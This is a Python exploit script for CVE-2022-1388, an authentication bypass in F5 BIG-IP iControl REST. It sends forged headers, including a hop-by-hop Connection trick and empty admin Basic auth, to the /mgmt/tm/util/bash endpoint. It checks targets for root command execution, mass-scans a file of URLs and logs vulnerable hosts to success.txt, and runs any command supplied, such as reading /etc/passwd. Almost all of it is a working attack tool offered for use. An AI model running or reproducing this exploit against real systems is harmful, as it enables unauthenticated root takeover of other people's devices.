#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
"""
@Desc    :   CVE-2022-1388 F5 BIG-IP iControl REST Auth Bypass RCE
"""


import os
import sys
import argparse
import requests
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)



headers = {
        "User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1",
        "Content-type": "application/json",
        "Connection": "close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host",
        "X-F5-Auth-Token": "anything",
        "Authorization": "Basic YWRtaW46"}

endpoint = "/mgmt/tm/util/bash"

def usage():
    print("Eg: \n    python3 exp.py -u https://127.0.0.1")
    print("    python3 exp.py -u https://127.0.0.1 -c 'cat /etc/passwd'")
    print("    python3 exp.py -f urls.txt")
    
def poc(target):
    url = requests.utils.urlparse(target).scheme + "://" + requests.utils.urlparse(target).netloc
    payload = {"command": "run", "utilCmdArgs": "-c id"}
    try:
        res = requests.post(url+endpoint, headers=headers, json=payload, proxies=None, timeout=15, verify=False)
        if (res.status_code == 200) and ('uid=0(root) gid=0(root) groups=0(root)' in res.text):
            print("[+] {} is vulnerable!!!".format(url))
            return True
        else:
            print("[-] {} is not vulnerable.".format(url))
            return False
    except Exception as e:
        print("[-] {} Exception: ".format(url) + e)
        pass
    
def exp(target, command):
    url = requests.utils.urlparse(target).scheme + "://" + requests.utils.urlparse(target).netloc
    payload = {"command": "run", "utilCmdArgs": "-c '{}'".format(command)}
    try:
        res = requests.post(url+endpoint, headers=headers, json=payload, proxies=None, timeout=15, verify=False)
        if (res.status_code == 200) and ("tm:util:bash:runstate" in res.text):
            print(res.json()['commandResult'])
            return True
        else:
            print("[-] {} is not vulnerable.".format(url))
            return False
    except Exception as e:
        print("[-] {} Exception: ".format(url) + e)
        pass

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="CVE-2022-1388 F5 BIG-IP iControl REST Auth Bypass RCE")
    parser.add_argument('-u', '--url', type=str,
                        help="vulnerability verification for individual websites")
    parser.add_argument('-c', '--command', type=str,
                        help="command execution")
    parser.add_argument('-f', '--file', type=str,
                        help="perform vulnerability checks on multiple websites in a file, and the vulnerable websites will be output to the success.txt file")
    args = parser.parse_args()
    if len(sys.argv) == 3:
        if sys.argv[1] in ['-u', '--url']:
            poc(args.url)
        elif sys.argv[1] in ['-f', '--file']:
            if os.path.isfile(args.file) == True:
                with open(args.file) as target:
                    urls = []
                    urls = target.read().splitlines()
                    for url in urls:
                        if poc(url) == True:
                            with open("success.txt", "a+") as f:
                                f.write(url + "\n")
    elif len(sys.argv) == 5:
        if set([sys.argv[1], sys.argv[3]]) < set(['-u', '--url', '-c', '--command']):
            exp(args.url, args.command)
    else:
        parser.print_help()
        usage()
